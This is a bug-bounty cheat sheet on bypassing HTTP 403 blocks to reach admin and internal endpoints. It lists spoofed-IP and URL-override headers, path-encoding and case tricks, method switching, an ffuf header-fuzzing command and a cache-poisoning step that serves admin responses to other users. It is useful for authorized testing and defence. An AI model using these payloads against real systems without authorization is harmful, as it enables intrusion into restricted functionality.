# Bypass 403 / Forbidden

> [!tldr] Hunter Summary
> **What:** Reach endpoints returning 403 via path tricks, header overrides, or method switching.
> **Impact:** Access admin panels, internal endpoints, restricted functionality.
> **Best targets:** `/admin`, `/internal`, `/api/admin`, any endpoint returning 403.
> **Time to triage:** 5–10 min with a header fuzz list.

---

## Step-by-Step Hunt

### Step 1 — Header-based bypass
Add these headers to your blocked request:
```http
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Override-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
X-Host: 127.0.0.1
X-Remote-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Custom-IP-Authorization: 127.0.0.1
X-Forwarded-Host: 127.0.0.1
X-Forward-For: 127.0.0.1

# Proxy headers
Forwarded: for=127.0.0.1
Via: 1.1 127.0.0.1
```

Example: blocked at `GET /admin`, try:
```http
GET /anything HTTP/1.1
Host: target.com
X-Original-URL: /admin
```

### Step 2 — Path variation bypass
```
# URL encoding
http://target.com/%2e/admin           (. encoded)
http://target.com/admin%20            (trailing space)
http://target.com/admin%09            (tab)
http://target.com/admin%00            (null byte)
http://target.com/admin..;/           (double slash)

# Path tricks
http://target.com/admin/.             
http://target.com//admin//            
http://target.com/./admin/..          
http://target.com/;/admin             
http://target.com/.;/admin            
http://target.com//;/admin            
http://target.com/admin/..;/          

# Case variation
http://target.com/ADMIN
http://target.com/Admin
http://target.com/aDmIn

# Unicode/overlong
http://target.com/%ef%bc%8fadmin      (fullwidth /)
http://target.com/%c0%afadmin
```

### Step 3 — Method switching
```
GET /admin → 403
POST /admin → 200?
PUT /admin → 200?
PATCH /admin → 200?
HEAD /admin → check response headers
TRACE /admin → may echo back request
OPTIONS /admin → see what methods allowed
```

### Step 4 — Protocol version
```
GET /admin HTTP/1.0   (no Host header)
GET /admin HTTP/2     (if app uses HTTP/2 with different routing)
```

### Step 5 — Web cache poisoning approach
```http
GET /anything HTTP/1.1
Host: victim.com
X-Original-URL: /admin
# May poison cache so others get admin response
```

### Step 6 — Brute force with header list
```bash
# Use ffuf with header list
cat > 403_headers.txt << 'EOF'
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-For: 127.0.0.1
X-Real-IP: 127.0.0.1
X-Client-IP: 127.0.0.1
EOF

ffuf -u https://target.com/anything -w 403_headers.txt -H "FUZZ" -mc 200,301,302
```

## 2025-2026 Updates

> [!info] New 403 bypass surface (2025-2026)
> - **Nginx off-by-slash:** `location /admin` (no trailing slash) — try `/admin/` to bypass
> - **CDN routing bypass:** Request to origin IP directly, bypassing CDN access control
> - **JWT claim-based bypass:** `X-Internal: true` header combined with JWT with wrong role — some middleware checks header first
> - **HTTP/2 header casing:** HTTP/2 requires lowercase headers, some WAFs check case-sensitive — `x-forwarded-for` vs `X-Forwarded-For`
